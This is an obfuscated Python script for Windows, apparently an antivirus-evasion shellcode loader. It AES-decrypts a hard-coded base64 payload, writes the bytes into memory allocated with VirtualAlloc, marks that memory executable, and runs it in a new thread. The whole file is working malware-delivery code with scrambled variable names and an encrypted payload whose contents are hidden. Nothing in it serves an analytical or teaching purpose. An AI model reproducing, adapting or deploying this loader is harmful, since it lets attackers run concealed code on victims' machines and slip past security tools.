import ctypes as gPblQijpuuYrVpW
from Crypto.Cipher import AES
import base64
RdCZJDbb = AES.new('{BgaMDWp.SZdRQwt2nidT0MO1Ax(fid(', AES.MODE_CBC, 'YASVyFmEphLDkPcU')
xmxWxlfuV = base64.b64decode('TDyq4iNFBm72qOFV3g1W/4Vmn4W/4iGQFnAcH3KALOlL7U+z9qAvtZ8HMC815i2SXuELZDdlqe7aRyK5/+a7pi5afHYoLunVdNa8zJ4huLe7hyBIQssZP8Gv8bWdoIYeczVWn4KcIVLy/e4XxQ6Vfs5UQDITDEDA+LFg+2AJUfb0JM2EZWOmULm+/q4ut/Fsibgf1AhyUJJjiZAzjK8sW/zmvmHJFzlqfYNKVkY3qkSlFmcUO6D77N210Lj2X0ZCjZNH6L/o9vWPlC5h/zwk9ktrFgqWo64RoFAFrU3B2wfvM/POj7kbpc2M4uYIQBrGNRfWOHM7n7qeCGDHBYZcYoijKcUm4c5S1tCCP61Nfp8cvhEBcyjc72fzK7kf2Ho8J3f4WaVVWfNV6lDu13RI4tU4Mcf1fEqV637P9HwsOdQo9EgkOtWChrIw/uGvZ/e2')
OzZNtD = RdCZJDbb.decrypt(xmxWxlfuV)
ZuGPOoQQtxpvBRk = gPblQijpuuYrVpW.windll.kernel32.VirtualAlloc(gPblQijpuuYrVpW.c_int(0),gPblQijpuuYrVpW.c_int(len(OzZNtD)),gPblQijpuuYrVpW.c_int(0x3000),gPblQijpuuYrVpW.c_int(0x04))
gPblQijpuuYrVpW.windll.kernel32.RtlMoveMemory(gPblQijpuuYrVpW.c_int(ZuGPOoQQtxpvBRk),OzZNtD,gPblQijpuuYrVpW.c_int(len(OzZNtD)))
TfYkcUfTVoUSHAk = gPblQijpuuYrVpW.windll.kernel32.VirtualProtect(gPblQijpuuYrVpW.c_int(ZuGPOoQQtxpvBRk),gPblQijpuuYrVpW.c_int(len(OzZNtD)),gPblQijpuuYrVpW.c_int(0x20),gPblQijpuuYrVpW.byref(gPblQijpuuYrVpW.c_uint32(0)))
qCbSqmLKXs = gPblQijpuuYrVpW.windll.kernel32.CreateThread(gPblQijpuuYrVpW.c_int(0),gPblQijpuuYrVpW.c_int(0),gPblQijpuuYrVpW.c_int(ZuGPOoQQtxpvBRk),gPblQijpuuYrVpW.c_int(0),gPblQijpuuYrVpW.c_int(0),gPblQijpuuYrVpW.pointer(gPblQijpuuYrVpW.c_int(0)))
gPblQijpuuYrVpW.windll.kernel32.WaitForSingleObject(gPblQijpuuYrVpW.c_int(qCbSqmLKXs),gPblQijpuuYrVpW.c_int(-1))